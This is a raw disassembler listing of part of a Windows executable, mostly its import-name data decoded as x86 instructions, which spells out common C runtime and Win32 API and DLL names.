  4093a8:	lods   al,BYTE PTR ds:[esi]
  4093a9:	call   0x0:0x9c0c0000
  4093b0:	pusha  
  4093b1:	call   0x0:0x9b520000
  4093b8:	mov    eax,0x9a
  4093bd:	add    BYTE PTR [eax],al
  4093bf:	add    ah,bh
  4093c1:	call   0x0:0x0
  4093c8:	sub    al,0x97
  4093ca:	add    BYTE PTR [eax],al
  4093cc:	outs   dx,BYTE PTR ds:[esi]
  4093cd:	call   0x0:0x9a520000
  4093d4:	xchg   BYTE PTR [edx-0x65860000],bl
  4093da:	add    BYTE PTR [eax],al
  4093dc:	add    BYTE PTR [eax],al
  4093de:	add    BYTE PTR [eax],al
  4093e0:	and    al,0x9c
  4093e2:	add    BYTE PTR [eax],al
  4093e4:	(bad)  
  4093e5:	fwait
  4093e6:	add    BYTE PTR [eax],al
  4093e8:	add    BYTE PTR [eax],al
  4093ea:	add    BYTE PTR [eax],al
  4093ec:	jle    0x409385
  4093ee:	add    BYTE PTR [eax],al
  4093f0:	inc    esp
  4093f1:	fwait
  4093f2:	add    BYTE PTR [eax],al
  4093f4:	xor    BYTE PTR [ebx+0x0],bl
  4093fa:	add    BYTE PTR [eax],al
  4093fc:	call   0x96:0xec000096
  409403:	add    BYTE PTR [ebx+ebx*4+0x0],dl
  40940a:	add    BYTE PTR [eax],al
  40940c:	mov    BYTE PTR [esi-0x642e0000],dl
  409412:	add    BYTE PTR [eax],al
  409414:	add    BYTE PTR [eax],al
  409416:	add    BYTE PTR [eax],al
  409418:	push   ds
  409419:	cwde   
  40941a:	add    BYTE PTR [eax],al
  40941c:	xor    bl,BYTE PTR [eax-0x68540000]
  409422:	add    BYTE PTR [eax],al
  409424:	ret    0x97
  409427:	add    BYTE PTR [eax],al
  409429:	add    BYTE PTR [eax],al
  40942b:	add    BYTE PTR [edx+0x97],dl
  409431:	add    BYTE PTR [eax],al
  409433:	add    BYTE PTR [eax+0x5200009a],bl
  409439:	xchg   edi,eax
  40943a:	add    BYTE PTR [eax],al
  40943c:	inc    edx
  40943d:	xchg   edi,eax
  40943e:	add    BYTE PTR [eax],al
  409440:	or     al,0x97
  409442:	add    BYTE PTR [eax],al
  409444:	mov    esi,0x96
  409449:	add    BYTE PTR [eax],al
  40944b:	add    BYTE PTR [edx],bl
  40944d:	popf   
  40944e:	add    BYTE PTR [eax],al
  409450:	cld    
  409451:	pushf  
  409452:	add    BYTE PTR [eax],al
  409454:	add    BYTE PTR [eax],al
  409456:	add    BYTE PTR [eax],al
  409458:	(bad)  
  409459:	call   0x0:0x9b5e0000
  409460:	add    BYTE PTR [eax],al
  409462:	add    BYTE PTR [eax],al
  409464:	cld    
  409465:	cdq    
  409466:	add    BYTE PTR [eax],al
  409468:	lock cdq 
  40946a:	add    BYTE PTR [eax],al
  40946c:	add    BYTE PTR [eax],al
  40946e:	add    BYTE PTR [eax],al
  409470:	or     bl,BYTE PTR [ebx-0x692e0000]
  409476:	add    BYTE PTR [eax],al
  409478:	sbb    bl,BYTE PTR [ebx+0x0]
  40947e:	add    BYTE PTR [eax],al
  409480:	fcom   DWORD PTR [edi-0x680e0000]
  409486:	add    BYTE PTR [eax],al
  409488:	add    BYTE PTR [eax],al
  40948a:	add    BYTE PTR [eax],al
  40948c:	mov    al,0x96
  40948e:	add    BYTE PTR [eax],al
  409490:	ficom  DWORD PTR [esi-0x68e40000]
  409496:	add    BYTE PTR [eax],al
  409498:	add    BYTE PTR [eax],al
  40949a:	add    BYTE PTR [eax],al
  40949c:	je     0x409439
  40949e:	add    BYTE PTR [eax],al
  4094a0:	loop   0x40943d
  4094a2:	add    BYTE PTR [eax],al
  4094a4:	sbb    bl,BYTE PTR [eax+eax*1+0x9ba600]
  4094ab:	add    BYTE PTR [eax],al
  4094ad:	add    BYTE PTR [eax],al
  4094af:	add    BYTE PTR [edx],ch
  4094b1:	popf   
  4094b2:	add    BYTE PTR [eax],al
  4094b4:	add    BYTE PTR [eax],al
  4094b6:	add    BYTE PTR [eax],al
  4094b8:	ds xchg esi,eax
  4094ba:	add    BYTE PTR [eax],al
  4094bc:	push   ds
  4094bd:	xchg   esi,eax
  4094be:	add    BYTE PTR [eax],al
  4094c0:	pop    esp
  4094c1:	xchg   esi,eax
  4094c2:	add    BYTE PTR [eax],al
  4094c4:	add    BYTE PTR [eax],al
  4094c6:	add    BYTE PTR [eax],al
  4094c8:	loop   0x40945f
  4094ca:	add    BYTE PTR [eax],al
  4094cc:	not    BYTE PTR [ebp-0x69fc0000]
  4094d2:	add    BYTE PTR [eax],al
  4094d4:	mov    dh,0x95
  4094d6:	add    BYTE PTR [eax],al
  4094d8:	test   al,0x95
  4094da:	add    BYTE PTR [eax],al
  4094dc:	sahf   
  4094dd:	xchg   ebp,eax
  4094de:	add    BYTE PTR [eax],al
  4094e0:	xchg   esi,eax
  4094e1:	xchg   ebp,eax
  4094e2:	add    BYTE PTR [eax],al
  4094e4:	retf   0x95
  4094e7:	add    BYTE PTR [esi+0x7c000095],cl
  4094ed:	xchg   ebp,eax
  4094ee:	add    BYTE PTR [eax],al
  4094f0:	push   0xffffff95
  4094f2:	add    BYTE PTR [eax],al
  4094f4:	inc    esi
  4094f5:	call   0x0:0x955c0000
  4094fc:	dec    esp
  4094fd:	xchg   ebp,eax
  4094fe:	add    BYTE PTR [eax],al
  409500:	ds call 0x0:0x953e0000
  409508:	xor    al,0x9a
  40950a:	add    BYTE PTR [eax],al
  40950c:	and    al,0x95
  40950e:	add    BYTE PTR [eax],al
  409510:	xor    dl,BYTE PTR [ebp-0x62560000]
  409516:	add    BYTE PTR [eax],al
  409518:	mov    dl,0x9d
  40951a:	add    BYTE PTR [eax],al
  40951c:	mov    esp,0x9d
  409521:	add    BYTE PTR [eax],al
  409523:	add    ah,ch
  409525:	add    ebx,DWORD PTR [edi+0x76]
  409528:	jae    0x409598
  40952a:	ja     0x40959c
  40952c:	jb     0x409597
  40952e:	outs   dx,BYTE PTR ds:[esi]
  40952f:	je     0x409597
  409531:	add    BYTE PTR ds:0x74657305,ah
  409537:	ins    BYTE PTR es:[edi],dx
  409538:	outs   dx,DWORD PTR ds:[esi]
  409539:	arpl   WORD PTR [ecx+0x6c],sp
  40953c:	add    BYTE PTR gs:[edi+0x0],ch
  409540:	pop    edi
  409541:	pop    eax
  409542:	arpl   WORD PTR [eax+0x74],si
  409545:	inc    esi
  409546:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0xc90072
  40954e:	pop    edi
  40954f:	pop    edi
  409550:	jo     0x4095b1
  409552:	pop    edi
  409553:	arpl   WORD PTR [edi+0x6d],bp
  409556:	ins    DWORD PTR es:[edi],dx
  409557:	outs   dx,DWORD PTR ds:[esi]
  409558:	fs add BYTE PTR gs:[eax],al
  40955c:	adc    DWORD PTR [ecx],eax
  40955e:	pop    edi
  40955f:	popa   
  409560:	ins    DWORD PTR es:[edi],dx
  409561:	jae    0x4095ca
  409563:	pop    edi
  409564:	gs js  0x4095d0
  409567:	je     0x409569
  409569:	add    cl,dh
  40956b:	add    BYTE PTR [edi+0x5f],bl
  40956e:	ja     0x4095d7
  409570:	gs je  0x4095e0
  409573:	popa   
  409574:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  40957b:	add    dl,ah
  40957d:	add    BYTE PTR [edi+0x5f],bl
  409580:	jae    0x4095e7
  409582:	je     0x4095e3
  409584:	popa   
  409585:	jo     0x4095f7
  409587:	pop    edi
  409588:	je     0x409603
  40958a:	jo     0x4095f1
  40958c:	add    BYTE PTR [eax],al
  40958e:	scas   al,BYTE PTR es:[edi]
  40958f:	add    al,0x65
  409591:	js     0x4095fc
  409593:	je     0x409595
  409595:	add    BYTE PTR [ebx+0x1],dh
  409598:	pop    edi
  409599:	gs js  0x409605
  40959c:	je     0x40959e
  40959e:	and    al,0x1
  4095a0:	pop    edi
  4095a1:	arpl   WORD PTR [ebp+0x78],sp
  4095a4:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x5f5f00ce
  4095ac:	jo     0x40960d
  4095ae:	pop    edi
  4095af:	ins    WORD PTR es:[edi],dx
  4095b1:	outs   dx,DWORD PTR ds:[esi]
  4095b2:	fs add BYTE PTR gs:[eax],al
  4095b6:	in     al,0x0
  4095b8:	pop    edi
  4095b9:	pop    edi
  4095ba:	jae    0x409621
  4095bc:	je     0x409633
  4095be:	jae    0x409625
  4095c0:	jb     0x40962f
  4095c2:	popa   
  4095c3:	je     0x40962d
  4095c5:	gs jb  0x40963a
  4095c8:	add    BYTE PTR [eax],al
  4095ca:	call   0x6ea9f4d0
  4095cf:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x6d006d72
  4095d7:	jae    0x40964f
  4095d9:	arpl   WORD PTR [edx+0x74],si
  4095dc:	cs fs ins BYTE PTR es:[edi],dx
  4095df:	ins    BYTE PTR es:[edi],dx
  4095e0:	add    BYTE PTR [eax],al
  4095e2:	xor    eax,0x65743f00
  4095e7:	jb     0x409656
  4095e9:	imul   ebp,DWORD PTR [esi+0x61],0x40406574
  4095f0:	pop    ecx
  4095f1:	inc    ecx
  4095f2:	pop    eax
  4095f3:	pop    eax
  4095f4:	pop    edx
  4095f5:	add    BYTE PTR [edi],dh
  4095f7:	add    DWORD PTR [edi+0x63],ebx
  4095fa:	outs   dx,DWORD PTR ds:[esi]
  4095fb:	outs   dx,BYTE PTR ds:[esi]
  4095fc:	je     0x409670
  4095fe:	outs   dx,DWORD PTR ds:[esi]
  4095ff:	ins    BYTE PTR es:[edi],dx
  409600:	data16 jo 0x409603
  409603:	add    BYTE PTR [edx+0x1],ch
  409606:	pop    edi
  409607:	gs js  0x40966d
  40960a:	gs jo  0x409681
  40960d:	pop    edi
  40960e:	push   0x6c646e61
  409613:	gs jb  0x40964a
  409616:	pop    edi
  409617:	arpl   WORD PTR [edi+0x6d],bp
  40961a:	ins    DWORD PTR es:[edi],dx
  40961b:	outs   dx,DWORD PTR ds:[esi]
  40961c:	outs   dx,BYTE PTR ds:[esi]
  40961d:	add    BYTE PTR [ebx],cl
  40961f:	add    BYTE PTR [ebp+0x6e],dl
  409622:	ins    BYTE PTR es:[edi],dx
  409623:	outs   dx,DWORD PTR ds:[esi]
  409624:	popa   
  409625:	fs push eax
  409627:	gs jb  0x409690
  40962a:	inc    ebx
  40962b:	outs   dx,DWORD PTR ds:[esi]
  40962c:	jne    0x40969c
  40962e:	je     0x409695
  409630:	jb     0x409686
  409632:	gs js  0x4096a9
  409635:	push   ebx
  409636:	je     0x4096aa
  409638:	imul   ebp,DWORD PTR [esi+0x67],0x6005773
  40963f:	add    BYTE PTR [eax+esi*2+0x52],cl
  409643:	gs ins BYTE PTR es:[edi],dx
  409645:	gs popa 
  409647:	jae    0x4096ae
  409649:	dec    ecx
  40964a:	outs   dx,BYTE PTR ds:[esi]
  40964b:	jae    0x4096c1
  40964d:	popa   
  40964e:	ins    BYTE PTR es:[edi],dx
  40964f:	ins    BYTE PTR es:[edi],dx
  409650:	popa   
  409651:	je     0x4096bc
  409653:	outs   dx,DWORD PTR ds:[esi]
  409654:	outs   dx,BYTE PTR ds:[esi]
  409655:	dec    ebp
  409656:	jne    0x4096cc
  409658:	gs js  0x40965b
  40965b:	add    BYTE PTR ds:0x41704c00,al
  409661:	arpl   WORD PTR [ecx+0x75],si
  409664:	imul   esi,DWORD PTR [edx+0x65],0x74736e49
  40966b:	popa   
  40966c:	ins    BYTE PTR es:[edi],dx
  40966d:	ins    BYTE PTR es:[edi],dx
  40966e:	popa   
  40966f:	je     0x4096da
  409671:	outs   dx,DWORD PTR ds:[esi]
  409672:	outs   dx,BYTE PTR ds:[esi]
  409673:	dec    ebp
  409674:	jne    0x4096ea
  409676:	gs js  0x409679
  409679:	add    BYTE PTR [edi+ebp*2+0x61],ch
  40967d:	fs jo  0x4096e5
  409680:	jb     0x4096e8
  409682:	cs fs ins BYTE PTR es:[edi],dx
  409685:	ins    BYTE PTR es:[edi],dx
  409686:	add    BYTE PTR [eax],al
  409688:	add    eax,0x74654700
  40968d:	inc    ebx
  40968e:	outs   dx,DWORD PTR ds:[esi]
  40968f:	ins    DWORD PTR es:[edi],dx
  409690:	ins    DWORD PTR es:[edi],dx
  409691:	popa   
  409692:	outs   dx,BYTE PTR ds:[esi]
  409693:	fs dec esp
  409695:	imul   ebp,DWORD PTR [esi+0x65],0x3a0057
  40969c:	push   ebx
  40969d:	gs je  0x4096f4
  4096a0:	push   0x64616572
  4096a5:	push   ebp
  4096a6:	dec    ecx
  4096a7:	dec    esp
  4096a8:	popa   
  4096a9:	outs   dx,BYTE PTR ds:[esi]
  4096aa:	addr16 jne 0x40970e
  4096ad:	add    BYTE PTR gs:0x4500,al
  4096b3:	jbe    0x40971a
  4096b5:	outs   dx,BYTE PTR ds:[esi]
  4096b6:	je     0x40970f
  4096b8:	jb     0x409723
  4096ba:	je     0x409721
  4096bc:	add    BYTE PTR [eax],al
  4096be:	and    eax,DWORD PTR [eax]
  4096c0:	push   edx
  4096c1:	gs addr16 push ecx
  4096c4:	jne    0x40972b
  4096c6:	jb     0x409741
  4096c8:	push   esi
  4096c9:	popa   
  4096ca:	ins    BYTE PTR es:[edi],dx
  4096cb:	jne    0x409732
  4096cd:	inc    ebp
  4096ce:	js     0x409727
  4096d0:	add    BYTE PTR [eax],al
  4096d2:	sub    eax,0x656c5300
  4096d7:	gs jo  0x4096da
  4096da:	add    eax,0x65764500
  4096df:	outs   dx,BYTE PTR ds:[esi]
  4096e0:	je     0x409737
  4096e2:	outs   dx,BYTE PTR ds:[esi]
  4096e3:	jb     0x40974a
  4096e5:	imul   esi,DWORD PTR [bp+di+0x74],0x39007265
  4096ed:	add    BYTE PTR [ebx+0x65],dl
  4096f0:	je     0x409746
  4096f2:	push   0x64616572
  4096f7:	push   eax
  4096f8:	jb     0x40975f
  4096fa:	data16 gs jb 0x409770
  4096fe:	gs fs push ebp
  409701:	dec    ecx
  409702:	dec    esp
  409703:	popa   
  409704:	outs   dx,BYTE PTR ds:[esi]
  409705:	addr16 jne 0x409769
  409708:	addr16 gs jae 0x40970c
  40970c:	push   ds
  40970d:	add    BYTE PTR [edx+0x65],dl
  409710:	addr16 dec edi
  409712:	jo     0x409779
  409714:	outs   dx,BYTE PTR ds:[esi]
  409715:	dec    ebx
  409716:	gs jns 0x40975e
  409719:	js     0x409772
  40971b:	add    BYTE PTR [ebx],al
  40971d:	add    BYTE PTR [ebp+0x76],al
  409720:	outs   dx,BYTE PTR gs:[esi]
  409722:	je     0x409776
  409724:	imul   esi,DWORD PTR gs:[bp+di+0x74],0xa007265
  40972d:	add    BYTE PTR [eax+0x65],cl
  409730:	popa   
  409731:	jo     0x409786
  409733:	gs je  0x40977f
  409736:	outs   dx,BYTE PTR ds:[esi]
  409737:	outs   dx,WORD PTR ds:[esi]
  409739:	jb     0x4097a8
  40973b:	popa   
  40973c:	je     0x4097a7
  40973e:	outs   dx,DWORD PTR ds:[esi]
  40973f:	outs   dx,BYTE PTR ds:[esi]
  409740:	add    BYTE PTR [eax],al
  409742:	push   cs
  409743:	add    BYTE PTR [edx+0x65],dl
  409746:	addr16 inc ebp
  409748:	outs   dx,BYTE PTR ds:[esi]
  409749:	jne    0x4097b8
  40974b:	dec    ebx
  40974c:	gs jns 0x409794
  40974f:	js     0x4097a8
  409751:	add    BYTE PTR [eax],al
  409753:	add    BYTE PTR [edx+0x65],dl
  409756:	addr16 inc ebx
  409758:	ins    BYTE PTR es:[edi],dx
  409759:	outs   dx,DWORD PTR ds:[esi]
  40975a:	jae    0x4097c1
  40975c:	dec    ebx
  40975d:	gs jns 0x409760
  409760:	lldt   WORD PTR [ebx+0x65]
  409764:	je     0x4097bb
  409766:	outs   dx,BYTE PTR ds:[esi]
  409767:	push   0x6c646e61
  40976c:	gs fs inc ebp
  40976f:	js     0x4097d4
  409771:	gs jo  0x4097e8
  409774:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  40977b:	gs jb  0x40977e
  40977e:	adc    BYTE PTR [eax],al
  409780:	inc    edi
  409781:	gs je  0x4097d1
  409784:	outs   dx,DWORD PTR ds:[esi]
  409785:	fs jne 0x4097f4
  409788:	gs dec eax
  40978a:	popa   
  40978b:	outs   dx,BYTE PTR ds:[esi]
  40978c:	fs ins BYTE PTR es:[edi],dx
  40978e:	gs inc ecx
  409790:	add    BYTE PTR [eax],al
  409792:	add    BYTE PTR [eax],al
  409794:	push   ecx
  409795:	jne    0x4097fc
  409797:	jb     0x409812
  409799:	push   eax
  40979a:	gs jb  0x409803
  40979d:	outs   dx,DWORD PTR ds:[esi]
  40979e:	jb     0x40980d
  4097a0:	popa   
  4097a1:	outs   dx,BYTE PTR ds:[esi]
  4097a2:	arpl   WORD PTR [ebp+0x43],sp
  4097a5:	outs   dx,DWORD PTR ds:[esi]
  4097a6:	jne    0x409816
  4097a8:	je     0x40980f
  4097aa:	jb     0x4097ac
  4097ac:	or     eax,0x74654700
  4097b1:	inc    ebx
  4097b2:	jne    0x409826
  4097b4:	jb     0x40981b
  4097b6:	outs   dx,BYTE PTR ds:[esi]
  4097b7:	je     0x409809
  4097b9:	jb     0x40982a
  4097bb:	arpl   WORD PTR [ebp+0x73],sp
  4097be:	jae    0x409809
  4097c0:	add    BYTE PTR fs:[ecx],dl
  4097c3:	add    BYTE PTR [edi+0x65],al
  4097c6:	je     0x40980b
  4097c8:	jne    0x40983c
  4097ca:	jb     0x409831
  4097cc:	outs   dx,BYTE PTR ds:[esi]
  4097cd:	je     0x409823
  4097cf:	push   0x64616572
  4097d4:	dec    ecx
  4097d5:	add    BYTE PTR fs:[eax],al
  4097d8:	adc    al,0x0
  4097da:	inc    edi
  4097db:	gs je  0x409831
  4097de:	jns    0x409853
  4097e0:	je     0x409847
  4097e2:	ins    DWORD PTR es:[edi],dx
  4097e3:	push   esp
  4097e4:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  4097eb:	ins    BYTE PTR es:[edi],dx
  4097ec:	gs push esp
  4097ee:	imul   ebp,DWORD PTR [ebp+0x65],0x47001800
  4097f5:	gs je  0x40984c
  4097f8:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  4097ff:	je     0x409801
  409801:	add    BYTE PTR [ecx],dl
  409803:	add    BYTE PTR [ebp+0x6e],dl
  409806:	push   0x6c646e61
  40980b:	gs fs inc ebp
  40980e:	js     0x409873
  409810:	gs jo  0x409887
  409813:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  40981a:	gs jb  0x40981d
  40981d:	add    BYTE PTR [eax+eax*1],cl
  409820:	inc    edi
  409821:	gs je  0x409867
  409824:	jne    0x409898
  409826:	jb     0x40988d
  409828:	outs   dx,BYTE PTR ds:[esi]
  409829:	je     0x40987b
  40982b:	jb     0x40989c
  40982d:	arpl   WORD PTR [ebp+0x73],sp
  409830:	jae    0x409832
  409832:	dec    ebx
  409833:	add    BYTE PTR [ebp+eiz*2+0x72],dl
  409837:	ins    DWORD PTR es:[edi],dx
  409838:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  40983f:	outs   dx,DWORD PTR ds:[esi]
  409840:	arpl   WORD PTR [ebp+0x73],sp
  409843:	jae    0x409845
  409845:	add    BYTE PTR [ecx+0x70],ah
  409848:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  409852:	outs   dx,DWORD PTR ds:[esi]
  409853:	jb     0x4098ba
  409855:	sub    eax,0x636f7270
  40985a:	gs jae 0x4098d0
  40985d:	outs   dx,BYTE PTR gs:[esi]
  40985f:	jbe    0x4098ca
  409861:	jb     0x4098d2
  409863:	outs   dx,BYTE PTR ds:[esi]
  409864:	ins    DWORD PTR es:[edi],dx
  409865:	outs   dx,BYTE PTR gs:[esi]
  409867:	je     0x409896
  409869:	ins    BYTE PTR es:[edi],dx
  40986a:	xor    DWORD PTR ds:0x2e302d32,ebp
  409870:	fs ins BYTE PTR es:[edi],dx
  409872:	ins    BYTE PTR es:[edi],dx
  409873:	add    BYTE PTR [ecx+0x70],ah
  409876:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  409880:	outs   dx,DWORD PTR ds:[esi]
  409881:	jb     0x4098e8
  409883:	sub    eax,0x61636f6c
  409888:	ins    BYTE PTR es:[edi],dx
  409889:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  409890:	sub    eax,0x322d316c
  409895:	sub    eax,0x6c642e31
  40989a:	ins    BYTE PTR es:[edi],dx
  40989b:	add    BYTE PTR [ecx+0x70],ah
  40989e:	imul   ebp,DWORD PTR ds:0x772d736d,0x652d6e69
  4098a8:	jbe    0x40990f
  4098aa:	outs   dx,BYTE PTR ds:[esi]
  4098ab:	je     0x409916
  4098ad:	outs   dx,BYTE PTR ds:[esi]
  4098ae:	addr16 sub eax,0x766f7270
  4098b4:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x2d316c2d
  4098bc:	xor    DWORD PTR ds:0x6c642e30,ebp
  4098c2:	ins    BYTE PTR es:[edi],dx
  4098c3:	add    BYTE PTR [ecx+0x70],ah
  4098c6:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  4098d0:	outs   dx,DWORD PTR ds:[esi]
  4098d1:	jb     0x409938
  4098d3:	sub    eax,0x69676572
  4098d8:	jae    0x40994e
  4098da:	jb     0x409955
  4098dc:	sub    eax,0x312d316c
  4098e1:	sub    eax,0x6c642e30
  4098e6:	ins    BYTE PTR es:[edi],dx
  4098e7:	add    BYTE PTR [ecx+0x70],ah
  4098ea:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  4098f4:	outs   dx,DWORD PTR ds:[esi]
  4098f5:	jb     0x40995c
  4098f7:	sub    eax,0x636e7973
  4098fc:	push   0x2d316c2d
  409901:	xor    ch,BYTE PTR ds:0x6c642e30
  409907:	ins    BYTE PTR es:[edi],dx
  409908:	add    BYTE PTR [eax],al
  40990a:	popa   
  40990b:	jo     0x409976
  40990d:	sub    eax,0x772d736d
  409912:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409919:	sub    eax,0x70616568
  40991e:	sub    eax,0x322d316c
  409923:	sub    eax,0x6c642e30
  409928:	ins    BYTE PTR es:[edi],dx
  409929:	add    BYTE PTR [ecx+0x70],ah
  40992c:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  409936:	outs   dx,DWORD PTR ds:[esi]
  409937:	jb     0x40999e
  409939:	sub    eax,0x6f727265
  40993e:	jb     0x4099a8
  409940:	popa   
  409941:	outs   dx,BYTE PTR ds:[esi]
  409942:	fs ins BYTE PTR es:[edi],dx
  409944:	imul   ebp,DWORD PTR [esi+0x67],0x2d316c2d
  40994b:	xor    DWORD PTR ds:0x6c642e31,ebp
  409951:	ins    BYTE PTR es:[edi],dx
  409952:	add    BYTE PTR [eax],al
  409954:	popa   
  409955:	jo     0x4099c0
  409957:	sub    eax,0x772d736d
  40995c:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409963:	sub    eax,0x7262696c
  409968:	popa   
  409969:	jb     0x4099e4
  40996b:	ins    BYTE PTR es:[edi],dx
  40996c:	outs   dx,DWORD PTR ds:[esi]
  40996d:	popa   
  40996e:	fs gs jb 0x40999f
  409972:	ins    BYTE PTR es:[edi],dx
  409973:	xor    DWORD PTR ds:0x2e302d32,ebp
  409979:	fs ins BYTE PTR es:[edi],dx
  40997b:	ins    BYTE PTR es:[edi],dx
  40997c:	add    BYTE PTR [eax],al
  40997e:	popa   
  40997f:	jo     0x4099ea
  409981:	sub    eax,0x772d736d
  409986:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  40998d:	sub    eax,0x666f7270
  409992:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2d],0x312d316c
  40999a:	sub    eax,0x6c642e30
  40999f:	ins    BYTE PTR es:[edi],dx
  4099a0:	add    BYTE PTR [eax],al
  4099a2:	popa   
  4099a3:	jo     0x409a0e
  4099a5:	sub    eax,0x772d736d
  4099aa:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  4099b1:	sub    eax,0x636f7270
  4099b6:	gs jae 0x409a2c
  4099b9:	je     0x409a23
  4099bb:	jb     0x409a22
  4099bd:	popa   
  4099be:	fs jae 0x4099ee
  4099c1:	ins    BYTE PTR es:[edi],dx
  4099c2:	xor    DWORD PTR ds:0x2e322d31,ebp
  4099c8:	fs ins BYTE PTR es:[edi],dx
  4099ca:	ins    BYTE PTR es:[edi],dx
  4099cb:	add    BYTE PTR [ecx+0x70],ah
  4099ce:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  4099d8:	outs   dx,DWORD PTR ds:[esi]
  4099d9:	jb     0x409a40
  4099db:	sub    eax,0x69737973
  4099e0:	outs   dx,BYTE PTR ds:[esi]
  4099e1:	outs   dx,WORD PTR ds:[esi]
  4099e3:	sub    eax,0x322d316c
  4099e8:	sub    eax,0x6c642e31
  4099ed:	ins    BYTE PTR es:[edi],dx
  4099ee:	add    BYTE PTR [eax],al
  4099f0:	or     eax,DWORD PTR [eax]
  4099f2:	ins    BYTE PTR es:[edi],dx
  4099f3:	jae    0x409a69
  4099f5:	jb     0x409a63
  4099f7:	outs   dx,BYTE PTR gs:[esi]
  4099f9:	push   edi
  4099fa:	add    BYTE PTR [eax],al
  4099fc:	add    eax,0x74736c00
  409a01:	jb     0x409a66
  409a03:	ins    DWORD PTR es:[edi],dx
  409a04:	jo     0x409a6f
  409a06:	push   edi
  409a07:	add    BYTE PTR [ecx+0x70],ah
  409a0a:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  409a14:	outs   dx,DWORD PTR ds:[esi]
  409a15:	jb     0x409a7c
  409a17:	sub    eax,0x69727473
  409a1c:	outs   dx,BYTE PTR ds:[esi]
  409a1d:	addr16 sub eax,0x6f73626f
  409a23:	ins    BYTE PTR es:[edi],dx
  409a24:	gs je  0x409a8c
  409a27:	sub    eax,0x312d316c
  409a2c:	sub    eax,0x6c642e30
  409a31:	ins    BYTE PTR es:[edi],dx
  409a32:	add    BYTE PTR [eax],al
  409a34:	mov    al,BYTE PTR ds:0x74736377
  409a3a:	outs   dx,DWORD PTR ds:[esi]
  409a3b:	jne    0x409aa9
  409a3d:	add    BYTE PTR [esi+0x74775f04],al
  409a43:	outs   dx,DWORD PTR ds:[esi]
  409a44:	data16 add BYTE PTR [edi],dl
  409a47:	add    al,0x5f
  409a49:	ja     0x409aae
  409a4b:	jae    0x409abb
  409a4d:	imul   esp,DWORD PTR [ebx+0x6d],0x90070
  409a54:	dec    eax
  409a55:	gs popa 
  409a57:	jo     0x409aab
  409a59:	gs inc ecx
  409a5b:	ins    BYTE PTR es:[edi],dx
  409a5c:	ins    BYTE PTR es:[edi],dx
  409a5d:	outs   dx,DWORD PTR ds:[esi]
  409a5e:	arpl   WORD PTR [eax],ax
  409a60:	sub    al,0x0
  409a62:	inc    edi
  409a63:	gs je  0x409aac
  409a66:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  409a6e:	add    al,BYTE PTR [eax]
  409a70:	dec    eax
  409a71:	gs popa 
  409a73:	jo     0x409ab6
  409a75:	ins    BYTE PTR es:[edi],dx
  409a76:	ins    BYTE PTR es:[edi],dx
  409a77:	outs   dx,DWORD PTR ds:[esi]
  409a78:	arpl   WORD PTR [eax],ax
  409a7a:	push   es
  409a7b:	add    BYTE PTR [eax+0x65],cl
  409a7e:	popa   
  409a7f:	jo     0x409ac7
  409a81:	jb     0x409ae8
  409a83:	add    BYTE PTR gs:[eax],al
  409a86:	add    BYTE PTR [eax],al
  409a88:	inc    edi
  409a89:	gs je  0x409adc
  409a8c:	jb     0x409afd
  409a8e:	arpl   WORD PTR [ebp+0x73],sp
  409a91:	jae    0x409adb
  409a93:	gs popa 
  409a95:	jo     0x409a97
  409a97:	add    BYTE PTR [ecx],ah
  409a99:	add    BYTE PTR [edx+0x65],dl
  409a9c:	addr16 push ecx
  409a9e:	jne    0x409b05
  409aa0:	jb     0x409b1b
  409aa2:	dec    ecx
  409aa3:	outs   dx,BYTE PTR ds:[esi]
  409aa4:	outs   dx,WORD PTR ds:[esi]
  409aa6:	dec    ebx
  409aa7:	gs jns 0x409b01
  409aaa:	add    BYTE PTR [eax],al
  409aac:	inc    edi
  409aad:	add    BYTE PTR [edx+0x65],dl
  409ab0:	popa   
  409ab1:	fs inc esi
  409ab3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x43000600
  409abb:	jb     0x409b22
  409abd:	popa   
  409abe:	je     0x409b25
  409ac0:	inc    esi
  409ac1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x4d000600
  409ac9:	jne    0x409b37
  409acb:	je     0x409b36
  409acd:	inc    edx
  409ace:	jns    0x409b44
  409ad0:	gs push esp
  409ad2:	outs   dx,DWORD PTR ds:[esi]
  409ad3:	push   edi
  409ad4:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x726168
  409adc:	add    eax,0x74654700
  409ae1:	dec    esp
  409ae2:	popa   
  409ae3:	jae    0x409b59
  409ae5:	inc    ebp
  409ae6:	jb     0x409b5a
  409ae8:	outs   dx,DWORD PTR ds:[esi]
  409ae9:	jb     0x409aeb
  409aeb:	add    BYTE PTR ds:0x74655300,cl
  409af1:	dec    esp
  409af2:	popa   
  409af3:	jae    0x409b69
  409af5:	inc    ebp
  409af6:	jb     0x409b6a
  409af8:	outs   dx,DWORD PTR ds:[esi]
  409af9:	jb     0x409afb
  409afb:	add    BYTE PTR [eax],al
  409afd:	add    BYTE PTR [ebx+0x6c],al
  409b00:	outs   dx,DWORD PTR ds:[esi]
  409b01:	jae    0x409b68
  409b03:	dec    eax
  409b04:	popa   
  409b05:	outs   dx,BYTE PTR ds:[esi]
